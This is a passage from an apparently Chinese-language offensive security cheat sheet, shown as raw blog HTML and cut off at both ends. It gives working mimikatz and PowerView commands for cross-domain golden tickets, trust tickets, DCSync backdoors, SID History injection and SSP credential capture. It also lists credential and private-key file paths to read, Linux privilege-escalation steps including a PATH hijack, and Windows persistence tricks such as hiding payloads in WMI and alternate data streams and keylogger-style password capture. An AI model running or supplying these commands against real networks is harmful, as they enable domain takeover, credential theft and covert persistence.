把系统中现有的普通用户提升为 sudo 用户可能会更靠谱点</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h2><h3 id="子域攻击父域-SID-History版跨域黄金票据"><a href="#子域攻击父域-SID-History版跨域黄金票据" class="headerlink" title="子域攻击父域 - SID History版跨域黄金票据"></a>子域攻击父域 - SID History版跨域黄金票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-NetGroup -Domain &lt;domain&gt; -GroupName &quot;Enterprise Admins&quot; -FullData|select objectsid</span><br><span class="line"></span><br><span class="line">mimikatz lsadump::trust</span><br><span class="line"></span><br><span class="line">kerberos::golden &#x2F;user:Administrator &#x2F;krbtgt:&lt;HASH_KRBTGT&gt; &#x2F;domain:&lt;domain&gt; &#x2F;sid:&lt;user_sid&gt; &#x2F;sids:&lt;RootDomainSID-519&gt; &#x2F;ptt</span><br></pre></td></tr></table></figure><h3 id="利用域信任密钥获取目标域的权限-信任票据"><a href="#利用域信任密钥获取目标域的权限-信任票据" class="headerlink" title="利用域信任密钥获取目标域的权限 - 信任票据"></a>利用域信任密钥获取目标域的权限 - 信任票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;lsadump::trust &#x2F;patch&quot;</span><br><span class="line">&quot;lsadump::lsa &#x2F;patch&quot;</span><br><span class="line"></span><br><span class="line">&quot;kerberos::golden &#x2F;user:Administrator &#x2F;domain:&lt;domain&gt; &#x2F;sid:  </span><br><span class="line">&lt;domain_SID&gt; &#x2F;rc4:&lt;trust_key&gt; &#x2F;service:krbtgt &#x2F;target:&lt;target_domain&gt; &#x2F;ticket:</span><br><span class="line">&lt;golden_ticket_path&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="攻击其它林"><a href="#攻击其它林" class="headerlink" title="攻击其它林"></a>攻击其它林</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用ptintbug或petipotam漏洞使其它林的DC主动连接到本林的一台无约束委派主机，同时抓取发送过来的TGT，然后即可将它用于dcsync攻击</span><br></pre></td></tr></table></figure><h2 id="活动目录持久性技巧"><a href="#活动目录持久性技巧" class="headerlink" title="活动目录持久性技巧"></a>活动目录持久性技巧</h2><p><a href="https://adsecurity.org/?p=1929">https://adsecurity.org/?p=1929</a> DS恢复模式密码维护 DSRM密码同步</p><blockquote><p>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:<a href="https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,%E5%8F%AF%E5%8F%82%E8%80%83%EF%BC%9A[%E5%B7%A7%E7%94%A8DSRM%E5%AF%86%E7%A0%81%E5%90%8C%E6%AD%A5%E5%B0%86%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96](http://drops.xmd5.com/static/drops/tips-9297.html)">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)</a></p></blockquote><p><a href="https://www.dcshadow.com/">DCshadow</a></p><h5 id="Security-Support-Provider"><a href="#Security-Support-Provider" class="headerlink" title="Security Support Provider"></a>Security Support Provider</h5><p>简单的理解为SSP就是一个DLL，用来实现身份认证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure><p>这样就不需要重启<code>c:/windows/system32</code>可看到新生成的文件kiwissp.log</p><h5 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a><a href="https://adsecurity.org/?p=1772">SID History</a></h5><p>SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot;</span><br></pre></td></tr></table></figure><h5 id="AdminSDHolder＆SDProp"><a href="#AdminSDHolder＆SDProp" class="headerlink" title="AdminSDHolder＆SDProp"></a><a href="https://adsecurity.org/?p=1906">AdminSDHolder＆SDProp</a></h5><p>利用AdminSDHolder＆SDProp（重新）获取域管理权限</p><h5 id="Dcsync后门"><a href="#Dcsync后门" class="headerlink" title="Dcsync后门"></a>Dcsync后门</h5><p>向域成员赋予Dcsync权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Powerview.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;vulntarget,DC&#x3D;com&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure><p>在登录了test1域账户的机器上执行Dcsync利用操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;lsadump::dcsync &#x2F;domain:vulntarget.com &#x2F;all &#x2F;csv&quot;</span><br></pre></td></tr></table></figure><h5 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h5><p><a href="https://adsecurity.org/?p=2716">https://adsecurity.org/?p=2716</a> <a href="https://www.anquanke.com/post/id/86531">策略对象在持久化及横向渗透中的应用</a></p><h5 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h5><p><a href="http://www.vuln.cn/6812">http://www.vuln.cn/6812</a></p><h5 id="Kerberoasting后门"><a href="#Kerberoasting后门" class="headerlink" title="Kerberoasting后门"></a>Kerberoasting后门</h5><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting">域渗透-Kerberoasting</a></p><h5 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h5><p><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence">Backdooring AdminSDHolder for Persistence</a></p><h5 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h5><p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence">Unconstrained Domain Persistence</a></p><p>证书伪造： <a href="https://github.com/Ridter/pyForgeCert">pyForgeCert</a></p><h1 id="11-敏感文件"><a href="#11-敏感文件" class="headerlink" title="11.敏感文件"></a>11.敏感文件</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>敏感配置文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini     <span class="comment">//查看系统版本</span></span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml    <span class="comment">//IIS配置文件</span></span><br><span class="line">C:\Windows\repair\sam     <span class="comment">//存储系统初次安装的密码</span></span><br><span class="line">C:\Program Files\mysql\my.ini     <span class="comment">//Mysql配置</span></span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD    <span class="comment">//Mysql root</span></span><br><span class="line">C:\Windows\php.ini    <span class="comment">//php配置信息</span></span><br><span class="line">C:\Windows\my.ini     <span class="comment">//Mysql配置信息</span></span><br><span class="line">C:\Windows\win.ini    <span class="comment">//Windows系统的一个基本系统配置文件</span></span><br></pre></td></tr></table></figure><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><p>敏感配置文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">#判断是否在docker容器内</span><br><span class="line">/proc/<span class="number">1</span>/cgroup</span><br><span class="line"></span><br><span class="line"># 系统版本</span><br><span class="line">cat /etc/issue</span><br><span class="line"></span><br><span class="line"># 内核版本</span><br><span class="line">cat /proc/version</span><br><span class="line"></span><br><span class="line"># 账户密码</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/shadow</span><br><span class="line"></span><br><span class="line"># 环境变量</span><br><span class="line">cat /etc/profile</span><br><span class="line"></span><br><span class="line"># 系统应用(命令)</span><br><span class="line">ls -lah/sbin</span><br><span class="line"></span><br><span class="line"># 安装应用(命令)</span><br><span class="line">la -lah /usr/bin</span><br><span class="line"></span><br><span class="line"># 开机自启</span><br><span class="line">cat /etc/crontab</span><br><span class="line"></span><br><span class="line"># history</span><br><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br><span class="line"></span><br><span class="line"># 网络配置</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/networks</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/host.conf</span><br><span class="line">cat /etc/hosts</span><br><span class="line">cat /etc/dhcpd.conf</span><br><span class="line"></span><br><span class="line"># Service配置</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /etc/httpd/conf/httpd2.conf</span><br><span class="line">cat /<span class="keyword">var</span>/apache2/config.inc</span><br><span class="line">cat /usr/local/etc/nginx/nginx.conf</span><br><span class="line">cat /usr/local/nginx/conf/nginx.conf</span><br><span class="line">cat /etc/my.cnf</span><br><span class="line">cat /etc/mysql/my.cnf</span><br><span class="line">cat /<span class="keyword">var</span>/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /etc/mongod.conf</span><br><span class="line">cat /usr/local/redis/redis.conf</span><br><span class="line">cat /etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line"># ftp</span><br><span class="line">cat /etc/proftpd.conf</span><br><span class="line"></span><br><span class="line"># mail</span><br><span class="line">cat /<span class="keyword">var</span>/mail/root</span><br><span class="line">cat /<span class="keyword">var</span>/spool/mail/root</span><br><span class="line">cat ~/.fetchmailrc</span><br><span class="line">cat /etc/procmailrc</span><br><span class="line">cat ~/.procmailrc</span><br><span class="line">cat /etc/exim/exim.cf</span><br><span class="line">cat /etc/postfix/main.cf</span><br><span class="line">cat /etc/mail/sendmail.mc</span><br><span class="line">cat /usr/share/sendmail/cf/cf/linux.smtp.mc</span><br><span class="line">cat /etc/mail/sendmail.cf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ssh</span><br><span class="line">cat ~<span class="regexp">/.ssh/</span>authorized_keys</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>dentity.pub</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>dentity</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa.pub</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_dsa.pub</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># log</span><br><span class="line">ls /<span class="keyword">var</span>/log</span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.log</span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/auth.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/chttp.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/cups/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/dpkg.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/faillog</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lastlog</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/lighttpd.access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/lighttpd.error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/messages</span><br><span class="line">cat /<span class="keyword">var</span>/log/secure</span><br><span class="line">cat /<span class="keyword">var</span>/log/syslog</span><br><span class="line">cat /<span class="keyword">var</span>/log/wtmp</span><br><span class="line">cat /<span class="keyword">var</span>/log/xferlog</span><br><span class="line">cat /<span class="keyword">var</span>/log/yum.log</span><br><span class="line">cat /<span class="keyword">var</span>/run/utmp</span><br><span class="line">cat /<span class="keyword">var</span>/webmin/miniserv.log</span><br><span class="line">cat /<span class="keyword">var</span>/www/logs/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/www/logs/access.log</span><br><span class="line"></span><br><span class="line"># proc fuzz</span><br><span class="line">/proc/self/fd/<span class="number">32</span></span><br><span class="line">/proc/self/fd/<span class="number">33</span></span><br><span class="line">/proc/self/fd/<span class="number">34</span></span><br><span class="line">/proc/self/fd/<span class="number">35</span></span><br><span class="line">/proc/sched_debug</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/net/arp</span><br><span class="line">/proc/net/route</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/net/fib_trie</span><br><span class="line">/proc/version</span><br></pre></td></tr></table></figure><h1 id="12-权限提升"><a href="#12-权限提升" class="headerlink" title="12.权限提升"></a>12.权限提升</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="bypass-UAC"><a href="#bypass-UAC" class="headerlink" title="bypass UAC"></a>bypass UAC</h3><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ul><li>使用IFileOperation COM接口</li><li>使用Wusa.exe的extract选项</li><li>远程注入SHELLCODE 到傀儡进程</li><li>DLL劫持，劫持系统的DLL文件</li><li>eventvwr.exe and registry hijacking</li><li>sdclt.exe</li><li>SilentCleanup</li><li>wscript.exe</li><li>cmstp.exe</li><li>修改环境变量，劫持高权限.Net程序</li><li>修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序</li><li>直接提权过UAC</li><li>……</li></ul><h5 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h5><ul><li><a href="https://github.com/hfiref0x/UACME">UACME</a></li><li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">Bypass-UAC</a></li><li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko">Yamabiko</a></li><li>…</li></ul><h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><ul><li>windows内核漏洞提权</li></ul><blockquote><p>检测类:<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>,<a href="https://github.com/brianwrf/WinSystemHelper">WinSystemHelper</a>,<a href="https://github.com/bitsadmin/wesng">wesng</a></p></blockquote><blockquote><p>利用类:<a href="https://github.com/SecWiki/windows-kernel-exploits">windows-kernel-exploits</a>，<a href="https://github.com/AlessandroZ/BeRoot.git">BeRoot</a></p></blockquote><ul><li>服务提权</li></ul><blockquote><p>数据库服务，ftp服务等</p></blockquote><ul><li>WINDOWS错误系统配置</li><li>系统服务的错误权限配置漏洞</li><li>不安全的注册表权限配置</li><li>不安全的文件/文件夹权限配置</li><li>计划任务</li><li>任意用户以NT AUTHORITY\SYSTEM权限安装msi</li><li>提权脚本</li></ul><blockquote><p><a href="https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1">PowerUP</a>,<a href="https://github.com/rsmudge/ElevateKit">ElevateKit</a></p></blockquote><h2 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h2><h4 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h4><p><a href="https://github.com/SecWiki/linux-kernel-exploits">linux-kernel-exploits</a></p><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">ls -al &#x2F;etc&#x2F; | grep cron</span><br><span class="line">ls -al &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;at.allow</span><br><span class="line">cat &#x2F;etc&#x2F;at.deny</span><br><span class="line">cat &#x2F;etc&#x2F;cron.allow</span><br><span class="line">cat &#x2F;etc&#x2F;cron.deny</span><br><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line">cat &#x2F;etc&#x2F;anacrontab</span><br><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>寻找可利用bin：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo “&#x2F;bin&#x2F;sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;home&#x2F;raj&#x2F;script</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/2767">Linux环境变量提权 - 先知社区)</a></p><h4 id="系统服务的错误权限配置漏洞"><a href="#系统服务的错误权限配置漏洞" class="headerlink" title="系统服务的错误权限配置漏洞"></a>系统服务的错误权限配置漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;apache2&#x2F;config.inc</span><br><span class="line">cat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYD</span><br><span class="line">cat &#x2F;root&#x2F;anaconda-ks.cfg</span><br></pre></td></tr></table></figure><h4 id="CVE-2021-4034"><a href="#CVE-2021-4034" class="headerlink" title="CVE-2021-4034"></a>CVE-2021-4034</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;berdav&#x2F;CVE-2021-4034</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;arthepsy&#x2F;CVE-2021-4034</span><br></pre></td></tr></table></figure><h4 id="不安全的文件-文件夹权限配置"><a href="#不安全的文件-文件夹权限配置" class="headerlink" title="不安全的文件/文件夹权限配置"></a>不安全的文件/文件夹权限配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~&#x2F;.bash_history</span><br><span class="line">cat ~&#x2F;.nano_history</span><br><span class="line">cat ~&#x2F;.atftp_history</span><br><span class="line">cat ~&#x2F;.mysql_history</span><br><span class="line">cat ~&#x2F;.php_history</span><br></pre></td></tr></table></figure><h4 id="找存储的明文用户名，密码"><a href="#找存储的明文用户名，密码" class="headerlink" title="找存储的明文用户名，密码"></a>找存储的明文用户名，密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla</span><br></pre></td></tr></table></figure><h1 id="13-权限维持"><a href="#13-权限维持" class="headerlink" title="13.权限维持"></a>13.权限维持</h1><h2 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h2><h5 id="1、密码记录工具"><a href="#1、密码记录工具" class="headerlink" title="1、密码记录工具"></a>1、密码记录工具</h5><p>WinlogonHack WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。 键盘记录器 安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。 NTPass 获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。 Linux 下 openssh 后门 重新编译运行的sshd服务，用于记录用户的登陆密码。</p><h5 id="2、常用的存储Payload位置"><a href="#2、常用的存储Payload位置" class="headerlink" title="2、常用的存储Payload位置"></a>2、常用的存储Payload位置</h5><p><strong>WMI</strong> : 存储：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$StaticClass &#x3D; New-Object Management.ManagementClass(&#39;root\cimv2&#39;, $null,$null)</span><br><span class="line">$StaticClass.Name &#x3D; &#39;Win32_Command&#39;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&#39;Command&#39; , $Payload)</span><br><span class="line">$StaticClass.Put() </span><br></pre></td></tr></table></figure><p>读取:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Payload&#x3D;([WmiClass] &#39;Win32_Command&#39;).Properties[&#39;Command&#39;].Value</span><br></pre></td></tr></table></figure><p><strong>包含数字签名的PE文件</strong> 利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名 <strong>特殊ADS</strong> …</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt; ...:putty.exe</span><br><span class="line">wmic process call create c:\test\ads\...:putty.exe</span><br></pre></td></tr></table></figure><p>特殊COM文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe</span><br><span class="line">wmic process call create \\.\C:\test\ads\COM1:putty.exe</span><br></pre></td></tr></table></figure><p>磁盘根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt;C:\:putty.exe </span><br><span class="line">wmic process call create C:\:putty.exe</span><br></pre></td></tr></table></figure><h5 id="3、Run-RunOnce-Keys"><a href="#3、Run-RunOnce-Keys" class="headerlink" title="3、Run/RunOnce Keys"></a>3、Run/RunOnce Keys</h5><p>用户级</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure><p>管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span 